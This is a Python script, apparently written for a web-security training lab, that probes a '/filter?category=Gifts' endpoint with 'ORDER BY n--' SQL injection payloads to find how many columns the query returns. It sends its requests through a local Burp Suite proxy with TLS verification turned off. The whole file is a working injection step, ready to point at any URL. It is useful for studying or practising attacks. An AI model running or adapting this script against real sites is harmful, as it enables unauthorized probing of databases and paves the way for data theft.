import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# if u want to use burp suite as proxy to see all requests. Default on.
use_proxy = True
proxy = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


def exploit_sql_injection_column_number(url: str) -> int:
    """
    Exploit SQL injection to figure out number of columns
    :param url: url to exploit
    :return: number of columns
    """
    path = "/filter?category=Gifts"
    for i in range(1, 50):
        sql_payload = f"+ORDER+BY+{i}--"
        if use_proxy:
            request_to_server = requests.get(
                url + path + sql_payload, verify=False, proxies=proxy
            )
        else:
            request_to_server = requests.get(url + path + sql_payload)
        if "Internal Server Error" in request_to_server.text:
            return i - 1
    return 0


def main() -> None:
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print(f"[-] Usage: {sys.argv[0]} <url> <payload> ")
        print(f"[-] Example: {sys.argv[0]} www.example.com '1=1'")
        sys.exit(-1)
    print("[-] Figuring out number of columns... please wait")
    number_of_columns = exploit_sql_injection_column_number(url)
    if number_of_columns:
        print(f"[+] SQL injections successful. Numbers of columns: {number_of_columns}")
    else:
        print("[-] SQL injections unsuccessful")


if __name__ == "__main__":
    main()
